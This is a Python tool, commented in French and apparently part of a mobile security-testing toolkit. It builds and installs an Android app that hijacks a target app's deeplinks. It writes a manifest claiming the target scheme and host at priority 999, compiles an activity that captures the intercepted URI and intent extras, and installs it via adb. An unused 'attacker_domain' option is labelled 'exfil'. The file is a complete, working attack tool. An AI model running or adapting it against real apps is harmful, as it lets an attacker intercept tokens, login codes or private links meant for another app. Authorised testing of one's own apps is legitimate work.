"""
run_deeplink_poc.py — Deeplink hijacking PoC tool.

Scaffolde le projet Android template si absent, patche le AndroidManifest.xml
avec le scheme/host cible, compile l'APK via Gradle et l'installe via adb.
Aucune dépendance externe au repo DeepLinkHijackingPoC — tout est embarqué ici.
"""

import os
import subprocess
import urllib.parse
from pathlib import Path
from typing import Optional

from tools.config import WORK_DIR

# ---------------------------------------------------------------------------
# Chemins
# ---------------------------------------------------------------------------

POC_DIR        = WORK_DIR / "DeepLinkHijackingPoC"
APP_DIR        = POC_DIR / "DeepLinkHijackingPoCApp"
MANIFEST_PATH  = APP_DIR / "app" / "src" / "main" / "AndroidManifest.xml"
APK_RELEASE_DIR = APP_DIR / "app" / "build" / "outputs" / "apk" / "release"

# ---------------------------------------------------------------------------
# Templates du projet Android minimal
# ---------------------------------------------------------------------------

MANIFEST_TEMPLATE = """\
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.poc.deeplinkhijacker">
    <application
        android:allowBackup="false"
        android:label="DeepLinkHijacker"
        android:theme="@style/Theme.AppCompat.Light">
        <activity
            android:name=".HijackActivity"
            android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
            <intent-filter android:priority="999">
                <action android:name="android.intent.action.VIEW" />
                <category android:name="android.intent.category.DEFAULT" />
                <category android:name="android.intent.category.BROWSABLE" />
                <data android:scheme="placeholder" android:host="placeholder" />
            </intent-filter>
        </activity>
    </application>
</manifest>
"""

BUILD_GRADLE_ROOT = """\
buildscript {
    repositories { google(); mavenCentral() }
    dependencies { classpath 'com.android.tools.build:gradle:7.0.2' }
}
allprojects {
    repositories { google(); mavenCentral() }
}
task clean(type: Delete) { delete rootProject.buildDir }
"""

BUILD_GRADLE_APP = """\
apply plugin: 'com.android.application'

android {
    compileSdkVersion 31
    defaultConfig {
        applicationId "com.poc.deeplinkhijacker"
        minSdkVersion 21
        targetSdkVersion 31
        versionCode 1
        versionName "1.0"
    }
    buildTypes {
        release {
            minifyEnabled false
            signingConfig signingConfigs.debug
        }
    }
    compileOptions {
        sourceCompatibility JavaVersion.VERSION_11
        targetCompatibility JavaVersion.VERSION_11
    }
}

dependencies {
    implementation 'androidx.appcompat:appcompat:1.3.1'
}
"""

SETTINGS_GRADLE = "rootProject.name = 'DeepLinkHijackingPoCApp'\ninclude ':app'\n"

GRADLE_WRAPPER_PROPS = """\
distributionBase=GRADLE_USER_HOME
distributionPath=wrapper/dists
distributionUrl=https\\://services.gradle.org/distributions/gradle-7.0.2-bin.zip
zipStoreBase=GRADLE_USER_HOME
zipStorePath=wrapper/dists
"""

HIJACK_ACTIVITY = """\
package com.poc.deeplinkhijacker;

import android.app.Activity;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.widget.ScrollView;
import android.widget.TextView;

public class HijackActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Intent intent = getIntent();
        Uri data = intent.getData();
        String intercepted = data != null ? data.toString() : "(no URI)";

        TextView tv = new TextView(this);
        tv.setTextSize(16);
        tv.setPadding(32, 32, 32, 32);
        tv.setText("🎯 Deeplink Hijacked!\\n\\nURI: " + intercepted
                + "\\n\\nExtras: " + intent.getExtras());

        ScrollView sv = new ScrollView(this);
        sv.addView(tv);
        setContentView(sv);
    }
}
"""

# ---------------------------------------------------------------------------
# Scaffolding
# ---------------------------------------------------------------------------

def _scaffold_project() -> None:
    """Crée le projet Android template complet si absent."""

    dirs = [
        APP_DIR / "app" / "src" / "main" / "java" / "com" / "poc" / "deeplinkhijacker",
        APP_DIR / "app" / "src" / "main" / "res",
        APP_DIR / "gradle" / "wrapper",
    ]
    for d in dirs:
        d.mkdir(parents=True, exist_ok=True)

    files = {
        MANIFEST_PATH:                                                           MANIFEST_TEMPLATE,
        APP_DIR / "build.gradle":                                                BUILD_GRADLE_ROOT,
        APP_DIR / "app" / "build.gradle":                                        BUILD_GRADLE_APP,
        APP_DIR / "settings.gradle":                                             SETTINGS_GRADLE,
        APP_DIR / "gradle" / "wrapper" / "gradle-wrapper.properties":           GRADLE_WRAPPER_PROPS,
        APP_DIR / "app" / "src" / "main" / "java" / "com" / "poc" /
            "deeplinkhijacker" / "HijackActivity.java":                          HIJACK_ACTIVITY,
    }
    for path, content in files.items():
        if not path.exists():
            path.write_text(content, encoding="utf-8")

    # gradlew — généré via `gradle wrapper` si Gradle est disponible, sinon téléchargé
    gradlew = APP_DIR / "gradlew"
    if not gradlew.exists():
        try:
            subprocess.run(
                ["gradle", "wrapper", "--gradle-version", "7.0.2"],
                cwd=APP_DIR, check=True,
                capture_output=True, timeout=60,
            )
        except Exception:
            # Fallback : télécharger le gradlew depuis GitHub
            import urllib.request
            url = "https://raw.githubusercontent.com/gradle/gradle/master/gradlew"
            urllib.request.urlretrieve(url, str(gradlew))
        gradlew.chmod(0o755)

# ---------------------------------------------------------------------------
# Patch du manifest
# ---------------------------------------------------------------------------

def _patch_manifest(scheme: str, host: str) -> None:
    content = MANIFEST_PATH.read_text(encoding="utf-8")
    content = content.replace('android:scheme="placeholder"', f'android:scheme="{scheme}"')
    content = content.replace('android:host="placeholder"',  f'android:host="{host}"')
    MANIFEST_PATH.write_text(content, encoding="utf-8")

def _reset_manifest() -> None:
    """Remet les placeholders pour le prochain run."""
    content = MANIFEST_PATH.read_text(encoding="utf-8")
    # Remplace la valeur patchée par placeholder (robuste via lxml si besoin)
    import re
    content = re.sub(r'android:scheme="[^"]+"', 'android:scheme="placeholder"', content)
    content = re.sub(r'android:host="[^"]+"',   'android:host="placeholder"',   content)
    MANIFEST_PATH.write_text(content, encoding="utf-8")

# ---------------------------------------------------------------------------
# Build
# ---------------------------------------------------------------------------

def _find_apk() -> Optional[Path]:
    """Trouve le premier APK généré dans le dossier release, quel que soit son nom."""
    if not APK_RELEASE_DIR.exists():
        return None
    apks = list(APK_RELEASE_DIR.glob("*.apk"))
    return apks[0] if apks else None


def _build_apk() -> tuple[bool, str, Optional[Path]]:
    gradlew = str(APP_DIR / "gradlew")
    result = subprocess.run(
        [gradlew, "assembleRelease"],
        cwd=APP_DIR,
        capture_output=True, text=True, timeout=300,
    )
    ok = result.returncode == 0
    log = result.stdout[-3000:] if result.stdout else ""
    err = result.stderr[-2000:] if result.stderr else ""
    apk = _find_apk() if ok else None
    return ok, (log + "\n" + err).strip(), apk

# ---------------------------------------------------------------------------
# Entrée principale du tool
# ---------------------------------------------------------------------------

def tool_run_deeplink_poc(args: dict, device: Optional[str] = None) -> str:
    deeplink        = args["deeplink"]
    install         = args.get("install", True)
    output_path     = args.get("output_path")
    attacker_domain = args.get("attacker_domain")

    lines = [
        f"🎯 Deeplink Hijacking PoC — {deeplink}",
        "─" * 55,
    ]

    # Parse du deeplink
    parsed = urllib.parse.urlparse(deeplink)
    scheme = parsed.scheme or "custom"
    host   = parsed.netloc or "*"
    lines.append(f"  scheme : {scheme}")
    lines.append(f"  host   : {host}")
    if attacker_domain:
        lines.append(f"  exfil  : {attacker_domain}")

    # 1. Scaffold
    lines.append("\n[1/3] Scaffolding projet Android template…")
    try:
        _scaffold_project()
        lines.append("  ✅ Projet prêt")
    except Exception as e:
        return "\n".join(lines) + f"\n\n❌ Scaffold échoué : {e}"

    # 2. Patch manifest
    lines.append("\n[2/3] Patch AndroidManifest.xml…")
    try:
        _patch_manifest(scheme, host)
        lines.append(f"  ✅ Manifest patché ({scheme}://{host})")
    except Exception as e:
        return "\n".join(lines) + f"\n\n❌ Patch manifest échoué : {e}"

    # 3. Build
    lines.append("\n[3/3] Build APK (Gradle assembleRelease)…")
    ok, build_log, apk_path = _build_apk()
    _reset_manifest()

    if not ok:
        lines.append("  ❌ Build échoué")
        lines.append("\n--- Gradle output ---")
        lines.append(build_log[-2000:])
        return "\n".join(lines)

    if not apk_path:
        lines.append("  ❌ Build OK mais APK introuvable dans le dossier release")
        return "\n".join(lines)

    lines.append(f"  ✅ APK généré : {apk_path}")

    # Copie optionnelle
    if output_path:
        import shutil
        shutil.copy(str(apk_path), output_path)
        lines.append(f"  📦 Copié vers : {output_path}")

    # Install adb
    if install:
        lines.append("\n[+] Installation via adb…")
        cmd = ["adb"]
        if device:
            cmd += ["-s", device]
        cmd += ["install", "-r", str(apk_path)]
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
        if r.returncode == 0:
            lines.append("  ✅ APK installé sur le device")
            lines.append("\n⚠️  Lance maintenant le deeplink cible pour déclencher le chooser :")
            lines.append(f"     adb shell am start -a android.intent.action.VIEW -d '{deeplink}'")
        else:
            lines.append(f"  ❌ adb install échoué : {r.stderr.strip()}")

    return "\n".join(lines)
